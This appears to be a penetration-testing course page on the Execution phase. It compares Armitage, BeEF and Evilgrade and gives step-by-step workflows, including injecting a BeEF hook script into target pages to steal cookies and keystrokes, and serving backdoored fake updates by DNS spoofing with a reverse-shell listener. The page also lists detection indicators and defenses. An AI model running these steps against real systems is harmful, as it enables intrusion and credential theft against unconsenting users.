# Phase 04: Execution

## Overview

The Execution phase covers techniques where adversaries run malicious code on a target system. In the MITRE ATT&CK framework, Execution (TA0002) encompasses methods that invoke adversary-controlled code, scripts, or binaries — whether through exploitation frameworks, client-side attacks, or software supply chain manipulation.

The tools in this phase represent three distinct execution vectors:

| Vector | Tool | Method |
|---|---|---|
| Server-side exploitation | Armitage | Metasploit GUI for network exploitation |
| Client-side exploitation | BeEF | Browser hooking and JavaScript-based attacks |
| Supply chain exploitation | Evilgrade | Fake software update interception |

Each tool operates at a different point in the attack lifecycle, and none is a replacement for the others. Armitage handles network-facing vulnerabilities. BeEF weaponizes the web browser. Evilgrade exploits trust in software update mechanisms.

---

## Tool Comparison Matrix

| Feature | Armitage | BeEF | Evilgrade |
|---|---|---|---|
| **Primary Vector** | Server exploits | Client-side browser | Software updates |
| **Language** | Java | Ruby | Perl |
| **Interface** | GUI (Swing) | Web UI | CLI (interactive shell) |
| **Prerequisites** | Metasploit, Java 11 | Ruby, Node.js | Perl, network MITM |
| **Kali Package** | `armitage` | `beef-xss` | `evilgrade` |
| **Collaboration** | Teamserver mode | Limited | No |
| **Module Count** | 2000+ (via Metasploit) | 200+ command modules | 63+ modules |
| **MITRE Tactic** | TA0002 | TA0002 | TA0002 |
| **Difficulty** | Intermediate | Intermediate | Advanced |
| **Persistence** | OS-level (Meterpreter) | Browser session only | Binary execution |

---

## Attack Lifecycle Integration

```
Phase 01: Reconnaissance
    ↓ (targets identified)
Phase 02: Weaponization
    ↓ (payloads prepared)
Phase 03: Delivery
    ↓ (attack surface exposed)
Phase 04: Execution          ← YOU ARE HERE
    ↓ (code runs on target)
Phase 05: Post-Exploitation
    ↓ (persistence, lateral movement)
```

Execution is the pivot point in the attack lifecycle. Before this phase, the adversary is preparing and delivering. After this phase, the adversary is establishing persistence and moving laterally. The tools in this phase represent the moment the attack succeeds or fails.

---

## Tool-Specific Workflows

### Armitage: Network Exploitation Workflow

```
1. Scan network:    Hosts → Nmap Scan → Intense Scan
2. Select target:   Right-click host → Attack
3. Choose exploit:  Browse exploit categories
4. Configure:       Set RHOST, LHOST, PAYLOAD
5. Exploit:         Launch → check sessions panel
6. Post-exploit:    Sessions → Interact → Meterpreter
```

Armitage is the most traditional execution tool in this phase. It provides a visual interface to Metasploit's exploitation engine. The teamserver feature enables multi-operator engagements where shared sessions prevent duplicated effort.

**Best for:** Network penetration tests, internal network exploitation, team-based engagements.

### BeEF: Client-Side Attack Workflow

```
1. Start BeEF:      sudo beef-xss
2. Deploy hook:      Inject <script src="http://IP:3000/hook.js"> into target page
3. Wait for victims: Browser appears in Hooked Browsers panel
4. Reconnaissance:   Browser Details, Get Plugins, Internal Network
5. Social eng:       Pretty Theft, Dialog boxes, Fake notifications
6. Credential theft: Cookies, Keystrokes, Form data
7. Pivot:            Use browser as network scanner and proxy
```

BeEF operates from the opposite direction of Armitage. Instead of exploiting server-side vulnerabilities, it weaponizes the client's browser. The hooked browser becomes a persistent command channel that can access internal resources, capture credentials, and serve as a pivot point.

**Best for:** Phishing engagements, red team operations, internal network reconnaissance through browser pivoting.

### Evilgrade: Supply Chain Workflow

```
1. Identify target app:   Which applications auto-update on the network?
2. Configure module:      evilgrade> configure <module>
3. Set payload:           evilgrade> set agent /path/to/payload.exe
4. Set up DNS:            ARP spoofing or DNS poisoning
5. Start services:        evilgrade> start
6. Set up listener:       msfconsole handler for reverse connection
7. Wait for victims:      evilgrade> show status
```

Evilgrade exploits trust in software updates. Most users accept updates without verifying signatures. Evilgrade intercepts the update mechanism and serves a backdoored binary. This attack is silent — the victim believes they are installing a legitimate update.

**Best for:** Supply chain assessments, internal network attacks where DNS control is established, targeted attacks against specific software.

---

## Detection & Defense Summary

### Network-Level Detection

| IOC | Tool | Detection Method |
|---|---|---|
| MSFRPC traffic (port 55553) | Armitage | Network monitoring |
| Requests to `/hook.js` | BeEF | URL pattern matching |
| DNS redirection for update domains | Evilgrade | DNS traffic analysis |
| HTTP connections to update servers | Evilgrade | Protocol monitoring |
| Reverse shell connections | All | Outbound connection analysis |

### Host-Level Detection

| IOC | Tool | Detection Method |
|---|---|---|
| Meterpreter DLL injection | Armitage | Memory forensics (malfind) |
| `window.beef` JavaScript object | BeEF | Browser developer tools |
| Suspicious update binaries | Evilgrade | Hash verification |
| Java process running msfrpcd | Armitage | Process monitoring |

### Defense Recommendations

1. **Patch management** — keep all software updated through verified channels
2. **Content Security Policy** — block unauthorized script sources (defeats BeEF)
3. **HTTPS for updates** — reject HTTP update connections (defeats Evilgrade)
4. **Network segmentation** — limit lateral movement after exploitation
5. **EDR/AV deployment** — detect Meterpreter and reverse shells
6. **User training** — recognize phishing and suspicious links
7. **DNS monitoring** — alert on resolution changes for known update domains
8. **Certificate verification** — enforce signature checking for all updates

---

## Engagement Planning

### Tool Selection Guide

| Engagement Type | Recommended Tool | Rationale |
|---|---|---|
| Network pentest | Armitage | Visual exploitation of network services |
| Red team (external) | BeEF + Armitage | Browser hook for initial access, then network exploitation |
| Internal pentest | Evilgrade + Armitage | DNS control enables fake updates, then lateral movement |
| Supply chain audit | Evilgrade | Tests software update security |
| Social engineering | BeEF | Browser hooking via phishing |
| Multi-operator | Armitage (teamserver) | Shared sessions and coordinated attack |

### Minimum Requirements

| Tool | Minimum | Recommended |
|---|---|---|
| Armitage | Java 11, Metasploit, PostgreSQL | Kali 2022+, 4GB RAM |
| BeEF | Ruby 3.0, Node.js 10, SQLite | Kali 2022+, 2GB RAM |
| Evilgrade | Perl, root access, network MITM | Kali, DNS control, 1GB RAM |

---

## Legal Considerations

All tools in this phase execute malicious code on target systems. Use only:

- On systems you own or have explicit written authorization to test
- Within the scope defined in your Rules of Engagement (RoE)
- With appropriate notification procedures in place
- With rollback plans for any changes made during testing

Unauthorized use of these tools constitutes a criminal offense in most jurisdictions. The tools themselves are legal — their application determines legality.

---

## File Index

| Tool | Documentation | Cheatsheet |
|---|---|---|
| Armitage | [armitage.md](armitage/armitage.md) | [CHEATSHEET.md](armitage/CHEATSHEET.md) |
| BeEF (beef-xss) | [beef-xss.md](beef-xss/beef-xss.md) | [CHEATSHEET.md](beef-xss/CHEATSHEET.md) |
| Evilgrade | [evilgrade.md](evilgrade/evilgrade.md) | [CHEATSHEET.md](evilgrade/CHEATSHEET.md) |

---

## Additional Execution Tools

The following tools are also part of the Execution phase in Kali Linux:

- **nishang** — PowerShell scripts for penetration testing and post-exploitation
- **powersploit** — PowerShell post-exploitation framework
- **xsser** — Automated XSS detection and exploitation framework

---

## Resources

- **MITRE ATT&CK Execution:** https://attack.mitre.org/tactics/TA0002/
- **Kali Tools - Execution:** https://www.kali.org/tools/#execution
- **Metasploit Unleashed:** https://www.offensive-security.com/metasploit-unleashed/
- **BeEF Documentation:** https://github.com/beefproject/beef/wiki
- **Evilgrade Repository:** https://github.com/infobyte/evilgrade
- **Armitage Manual:** http://www.fastandeasyhacking.com
